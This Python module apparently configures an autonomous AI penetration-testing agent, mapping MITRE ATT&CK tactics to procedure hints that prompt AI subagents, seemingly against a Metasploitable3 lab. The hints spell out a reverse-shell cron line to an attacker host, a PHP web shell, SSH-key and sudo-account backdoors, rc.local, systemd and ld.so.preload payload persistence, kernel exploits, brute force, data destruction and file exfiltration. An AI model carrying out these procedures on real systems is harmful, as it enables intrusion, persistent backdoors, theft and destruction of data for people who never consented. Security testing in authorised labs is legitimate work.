"""MITRE ATT&CK technique catalog — the shared vocabulary for the T/P boundary.

The three-layer model draws a line at the MITRE Tactic → Technique → Procedure
hierarchy:

  * Tactic     (the node's goal, e.g. "persistence")     — fixed by the graph
  * Technique  (cron vs systemd vs ssh-key vs account)    — the REPLANNER chooses
  * Procedure  (the exact commands under a technique)      — the SUBAGENT chooses

This module is the single source of truth for the *technique* layer. Both the
replanner's "grow the next technique" menu and each subagent's "execute
procedures under the assigned technique" prompt read from here, so the two never
drift apart.

The boundary LAW encoded here: crossing a (sub-)technique boundary is a graph
mutation (replanner grows a new node); anything within one technique is the
subagent's procedure work.

Persistence is fully populated (the first tactic wired end-to-end). Other tactics
are seeded so the structure is uniform and other subagents can adopt the same
pattern; extend them as each stage is converted.
"""
from __future__ import annotations

from dataclasses import dataclass, field
from typing import Optional


@dataclass(frozen=True)
class Technique:
    """One MITRE ATT&CK (sub-)technique — a menu item for the replanner and the
    scope contract for a subagent."""
    id: str                              # ATT&CK id, e.g. "T1053.003"
    slug: str                            # internal key, matches persistence _classify()
    name: str                            # human name, e.g. "Scheduled Task/Job: Cron"
    tactic: str                          # MITRE tactic slug, e.g. "persistence"
    min_privilege: str = "user"          # "user" | "root" — least access that works
    session_types: tuple = ("command_shell", "meterpreter")
    requires: tuple = ()                 # free-form preconditions, e.g. ("ssh_open",)
    procedure_hint: str = ""             # canonical procedures the subagent executes

    def applies(self, access_level: str, session_type: str) -> bool:
        """Is this technique usable given current access + session type?"""
        if session_type and self.session_types and session_type not in self.session_types:
            return False
        if self.min_privilege == "root" and access_level in ("user",):
            # 'unknown'/'user_with_sudo'/'root' are treated as root-capable — the
            # persistence stage already makes that call in _get_recommended_techniques.
            return False
        return True


# =============================================================================
# PERSISTENCE (TA0003) — fully wired prototype tactic
# =============================================================================
# Ordered least-privilege-first: a non-root command_shell should reach for cron /
# ssh-key / shell-profile before root-only techniques. Slugs MATCH the persistence
# stage's _classify() outputs so findings, critic, and catalog all agree.

_PERSISTENCE: list[Technique] = [
    Technique(
        id="T1053.003", slug="cron_job", tactic="persistence",
        name="Scheduled Task/Job: Cron",
        min_privilege="user",
        procedure_hint=(
            "Install a user crontab entry. Prove EXECUTION, not just the listing: "
            "a 1-min heartbeat writing an epoch to /tmp/.hb, wait ~65s, then "
            "cat /tmp/.hb expects a timestamp line. A reverse-shell cron "
            "(bash -i >& /dev/tcp/<kali>/<port>) is an alternative procedure — verify "
            "with a Kali listener callback. `crontab -l` alone is NOT proof."
        ),
    ),
    Technique(
        id="T1053.002", slug="at_job", tactic="persistence",
        name="Scheduled Task/Job: At",
        min_privilege="user",
        procedure_hint=(
            "One-shot scheduler — complements cron, useful when crond is flaky. "
            "echo 'date >> /tmp/.hb' | at now + 1 minute; confirm it queued with atq. "
            "Prove EXECUTION like the cron heartbeat: after the minute, cat /tmp/.hb "
            "expects a timestamp line. Needs the atd daemon and the `at` binary; if "
            "absent, fall back to cron. atq alone is NOT proof."
        ),
    ),
    Technique(
        id="T1098.004", slug="ssh_key", tactic="persistence",
        name="Account Manipulation: SSH Authorized Keys",
        min_privilege="user", requires=("ssh_open",),
        procedure_hint=(
            "ssh-keygen on Kali, append the PUBLIC key to the target user's "
            "~/.ssh/authorized_keys (chmod 700 ~/.ssh, 600 authorized_keys). "
            "Prove it with: ssh -i <key> -o StrictHostKeyChecking=no <user>@<target> id. "
            "Requires sshd on the target (port 22). Inject the REAL pubkey text, never "
            "a <PUBKEY> placeholder."
        ),
    ),
    Technique(
        id="T1505.003", slug="web_shell", tactic="persistence",
        name="Server Software Component: Web Shell",
        min_privilege="user", requires=("web_root_writable",),
        procedure_hint=(
            "Drop a minimal web shell into a served webroot (e.g. /var/www/html for "
            "Apache) — PHP: <?php system($_GET['c']); ?>. Persistence over HTTP as the "
            "web-server user. Prove EXECUTION from Kali with "
            "curl 'http://<target>/<name>.php?c=id' expecting a uid= line — a written "
            "file alone is NOT proof. Only viable with a writable webroot + a live web "
            "server (MS3: Apache / Drupal / Continuum)."
        ),
    ),
    Technique(
        id="T1546.004", slug="shell_profile", tactic="persistence",
        name="Event Triggered Execution: Unix Shell Configuration Modification",
        min_privilege="user",
        procedure_hint=(
            "Append a payload line to the target user's ~/.bashrc (or ~/.profile). "
            "Fires on next interactive login. Verify by reading back the appended line "
            "(tail -3 ~/.bashrc). Less reliable than cron — no periodic firing."
        ),
    ),
    Technique(
        id="T1136.001", slug="user_account", tactic="persistence",
        name="Create Account: Local Account",
        min_privilege="root",
        procedure_hint=(
            "useradd -m -s /bin/bash -G sudo <user>; set a password via chpasswd. "
            "Prove login works: sshpass -p '<pw>' ssh -o StrictHostKeyChecking=no "
            "<user>@<target> id. Needs root. Visible in /etc/passwd — least stealthy."
        ),
    ),
    Technique(
        id="T1037.004", slug="rc_local", tactic="persistence",
        name="Boot or Logon Init Scripts: RC Scripts",
        min_privilege="root",
        procedure_hint=(
            "Boot persistence for NON-systemd Linux (MS3 ub1404 = upstart/init — the "
            "correct root boot technique here, where systemd is absent). Append a "
            "payload line before 'exit 0' in /etc/rc.local (ensure it stays "
            "executable), OR drop /etc/init.d/<name> and run update-rc.d <name> "
            "defaults. Prove the entry is present + executable; a boot-fired payload "
            "can also drop a /tmp artifact to confirm. Needs root."
        ),
    ),
    Technique(
        id="T1543.002", slug="systemd_service", tactic="persistence",
        name="Create or Modify System Process: Systemd Service",
        min_privilege="root",
        procedure_hint=(
            "Write a unit to /etc/systemd/system/<name>.service that ExecStarts a "
            "payload, then systemctl daemon-reload && systemctl enable --now <name>. "
            "Prove with systemctl is-active <name> (expect 'active') and is-enabled "
            "(expect 'enabled'). Needs root and a systemd target (MS3 ub1404 uses "
            "upstart/init — prefer an init.d script or cron there)."
        ),
    ),
    Technique(
        id="T1574.006", slug="ld_preload", tactic="persistence",
        name="Hijack Execution Flow: Dynamic Linker Hijacking",
        min_privilege="root",
        procedure_hint=(
            "System-wide library injection: compile a small .so with a constructor "
            "payload (gcc on target or cross-build on Kali to the target ABI), then "
            "add its path to /etc/ld.so.preload so it loads into every dynamically "
            "linked process. Stealthy but harder to verify — confirm the "
            "/etc/ld.so.preload entry AND trigger a benign dynamic binary so the "
            "constructor fires (e.g. drop a /tmp artifact). Needs root."
        ),
    ),
]


# =============================================================================
# OTHER TACTICS — seeded (extend as each subagent is converted to the T/P split)
# =============================================================================

_PRIVILEGE_ESCALATION: list[Technique] = [
    Technique(id="T1068", slug="kernel_exploit", tactic="privilege_escalation",
              name="Exploitation for Privilege Escalation", min_privilege="user",
              procedure_hint="Kernel/local exploit (e.g. overlayfs CVE-2015-1328, "
                             "dirtycow) or local_exploit_suggester on the session."),
    Technique(id="T1548.003", slug="sudo", tactic="privilege_escalation",
              name="Abuse Elevation Control Mechanism: Sudo", min_privilege="user",
              procedure_hint="Enumerate sudo -l; abuse a NOPASSWD or GTFOBins-eligible "
                             "binary to reach root."),
    Technique(id="T1574", slug="suid_abuse", tactic="privilege_escalation",
              name="Hijack Execution Flow (SUID/path abuse)", min_privilege="user",
              procedure_hint="find / -perm -4000; abuse a writable SUID binary or a "
                             "hijackable PATH/library."),
]

_INITIAL_ACCESS: list[Technique] = [
    Technique(id="T1210", slug="remote_service_exploit", tactic="initial_access",
              name="Exploitation of Remote Services", min_privilege="user",
              session_types=(), procedure_hint="MSF exploit module against a detected "
                             "vulnerable service (proftpd, unrealircd, samba, ...)."),
    Technique(id="T1110", slug="brute_force", tactic="initial_access",
              name="Brute Force", min_privilege="user", session_types=(),
              procedure_hint="hydra/ssh_login against a login service with a credential "
                             "list; rotate creds before switching vector."),
]

_IMPACT: list[Technique] = [
    Technique(id="T1485", slug="data_destruction", tactic="impact",
              name="Data Destruction", min_privilege="user",
              procedure_hint="Overwrite/delete target files to prove impact."),
    Technique(id="T1005", slug="data_collection", tactic="impact",
              name="Data from Local System", min_privilege="user",
              procedure_hint="Read/exfil a sentinel file as proof of compromise."),
]

_DISCOVERY: list[Technique] = [
    Technique(id="T1046", slug="network_service_scan", tactic="discovery",
              name="Network Service Discovery", min_privilege="user", session_types=(),
              procedure_hint="nmap service/version scan of the target."),
]


_CATALOG: dict[str, list[Technique]] = {
    "persistence": _PERSISTENCE,
    "privilege_escalation": _PRIVILEGE_ESCALATION,
    "initial_access": _INITIAL_ACCESS,
    "impact": _IMPACT,
    "discovery": _DISCOVERY,
}


# =============================================================================
# LOOKUP HELPERS
# =============================================================================

def technique_menu(tactic: str) -> list[Technique]:
    """Ordered technique menu for a tactic (empty list if the tactic is unknown)."""
    return list(_CATALOG.get((tactic or "").lower(), []))


def get_technique(tactic: str, id_or_slug: str) -> Optional[Technique]:
    """Resolve a technique by ATT&CK id ('T1053.003') OR internal slug ('cron_job')."""
    if not id_or_slug:
        return None
    key = id_or_slug.strip()
    for t in technique_menu(tactic):
        if key == t.id or key.lower() == t.slug:
            return t
    return None


def resolve_any(id_or_slug: str) -> Optional[Technique]:
    """Resolve a technique across ALL tactics (useful when only the id is known)."""
    if not id_or_slug:
        return None
    for tactic in _CATALOG:
        t = get_technique(tactic, id_or_slug)
        if t:
            return t
    return None


def next_untried(tactic: str, failed: "list[str] | set[str] | tuple",
                 access_level: str = "unknown",
                 session_type: str = "command_shell") -> Optional[Technique]:
    """Pick the next menu technique not in `failed` (by id OR slug) that applies to
    the current access level + session type. Returns None when the menu is
    exhausted — that (and only that) is when persistence has truly no next move."""
    failed_norm = {str(f).strip().lower() for f in (failed or [])}
    for t in technique_menu(tactic):
        if t.id.lower() in failed_norm or t.slug in failed_norm:
            continue
        if not t.applies(access_level, session_type):
            continue
        return t
    return None


def menu_summary(tactic: str, failed: "list[str] | set[str] | tuple" = (),
                 access_level: str = "unknown",
                 session_type: str = "command_shell") -> str:
    """Human/LLM-readable menu for injection into the replanner context.

    Marks each technique TRIED (already failed), N/A (wrong privilege/session), or
    AVAILABLE so the replanner grows an available one and never re-proposes a
    failed technique."""
    failed_norm = {str(f).strip().lower() for f in (failed or [])}
    lines = [f"MITRE technique menu for tactic '{tactic}':"]
    for t in technique_menu(tactic):
        if t.id.lower() in failed_norm or t.slug in failed_norm:
            status = "TRIED (failed — do not repeat)"
        elif not t.applies(access_level, session_type):
            status = f"N/A (needs {t.min_privilege}/{'|'.join(t.session_types) or 'any'})"
        else:
            status = "AVAILABLE"
        lines.append(f"  - {t.id} {t.slug} ({t.name}) — {status}")
    if len(lines) == 1:
        lines.append("  (no techniques catalogued for this tactic)")
    return "\n".join(lines)
